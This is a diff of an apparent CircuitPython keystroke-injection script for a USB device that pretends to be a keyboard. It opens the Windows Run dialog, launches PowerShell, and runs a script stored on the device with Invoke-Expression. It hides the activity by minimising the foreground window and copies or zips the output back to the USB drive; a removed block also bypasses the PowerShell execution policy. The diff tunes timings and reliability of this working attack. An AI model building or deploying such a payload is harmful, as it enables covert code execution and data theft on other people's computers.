@@ -73,7 +73,7 @@ def press_enter2(kbd, delay=0.1):
         blink_status(COLORS["error"], 1)
 
 # Keypress wrapper - pass a kbd object
-def press_key(kbd, key1, key2=None, delay=0.3):
+def press_key(kbd, key1, key2=None, delay=0.1):
     try:
         if key2:
             kbd.press(key1, key2)
@@ -97,7 +97,7 @@ def press_backspace(kbd, count=1, delay=0.1):
 def a_writeln(kbd, layout, command):
     try:
         layout.write(command)
-        time.sleep(0.5)
+        time.sleep(0.05)
         press_enter2(kbd)
 
     except Exception:
@@ -121,8 +121,11 @@ def run_ps(kbd, layout, command):
 
     try:
         press_key(kbd, Keycode.WINDOWS, Keycode.R)
-        time.sleep(1)
+        time.sleep(0.1)
         a_writeln(kbd, layout, "powershell")  
+        # Enter presses tend to get lost depending on env
+        press_enter2(kbd)
+        time.sleep(0.3)
         press_backspace(kbd, count=10)
         a_writeln(kbd, layout, command)
 
@@ -222,37 +225,18 @@ def demos():
 
 
 def main():  
-    command = """ 
-Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class Win32 {
-    [DllImport(\"user32.dll\")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport(\"user32.dll\")]
-    public static extern IntPtr GetForegroundWindow();
-}
-'@
-$env:v=(Get-Content -ErrorAction SilentlyContinue -Force -Path F:/sd/demo.ps1) -join "`n"; 
-& powershell -ExecutionPolicy Bypass -noprofile -Command "'$env:v' | IEX | Out-File c:/windows/temp/sout.txt; exit" ; 
-[Win32]::ShowWindow([Win32]::GetForegroundWindow(), 6);
-cp c:/windows/temp/sout.txt f:/sd/; 
-exit;
-    """
-
     command2 = """
-del C:/windows/temp/sout.txt;
+$o="C:/windows/temp/sout.txt";
+$dl = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
+if (Test-Path $o) { del $o };
 Start-Job -ScriptBlock { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Threading; public class W { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); public static void D(int d) { Thread.Sleep(d); ShowWindow(GetForegroundWindow(), 6); } }'; [W]::D(5000); }
-$v = (Get-Content -Force -Path F:/sd/demo.ps1) -join "`n";
-Invoke-Expression $v | Out-File -FilePath C:/windows/temp/sout.txt -Force;
-while (-not (Test-Path C:/windows/temp/sout.txt)) { Start-Sleep -Milliseconds 500 };
-Copy-Item -Path C:/windows/temp/sout.txt -Destination F:/sd/ -Force;
+$v = (Get-Content "$dl/sd/demo.ps1") -join "`n";
+Invoke-Expression $v | Out-File -FilePath $o -Force;
+while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 };
+Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o).zip";
 exit;
 """
-    
-    toggle_storage()
+
     run_ps(kbd, layout, command2)
-    toggle_storage()
 
 main() 
- 
